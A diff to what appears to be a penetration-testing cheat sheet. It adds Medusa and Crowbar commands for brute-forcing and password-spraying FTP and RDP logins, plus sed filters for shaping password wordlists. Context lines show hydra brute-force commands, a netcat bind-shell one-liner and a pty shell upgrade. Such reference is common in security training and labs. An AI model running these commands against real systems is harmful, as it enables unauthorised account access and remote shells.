@@ -54,6 +54,21 @@ hydra -L user.list -P password.list smb://<ip>
 ```bash
 hydra -C user_pass.list ssh://<ip>
 ```
+---
+## [Medusa](https://github.com/jmk-foofus/medusa)
+---
+- Password Cracking for Specific Username (ftp)
+```bash
+medusa -h $IP -u Username -P passfile.list -M ftp
+```
+- Username Cracking for Specific Password (passspray)
+```bash
+medusa -h $IP -U usersfile.txt -p Password123!! -M ftp
+```
+- Cracking for Username and password from a list
+```bash
+medusa -h $IP -U usersfile.txt -p passfile.list -M ftp
+```
 
 ---
 ## Netcat
@@ -79,7 +94,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> 
 ---
 ## Python
 ---
-- Python Http Server
+- Python shell upgrade
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -275,7 +290,11 @@ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ 
 ```bash
 ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
 ```
-
+---
+## Crowbar - password spray rdp
+```bash
+crowbar -b rdp -s $IP/32 -U users.txt -c 'password123'
+```
 ---
 
 ## Hash
@@ -330,3 +349,15 @@ or
 ps
 ```
 
+
+- Remove characters (various methods)
+
+```bash
+sed -ri '/^.{,7}$/d' file.txt            # remove shorter than 8
+```
+```bash
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' file.txt # remove no special chars
+```
+```bash
+sed -ri '/[0-9]+/!d' file.txt            # remove no numbers
+```
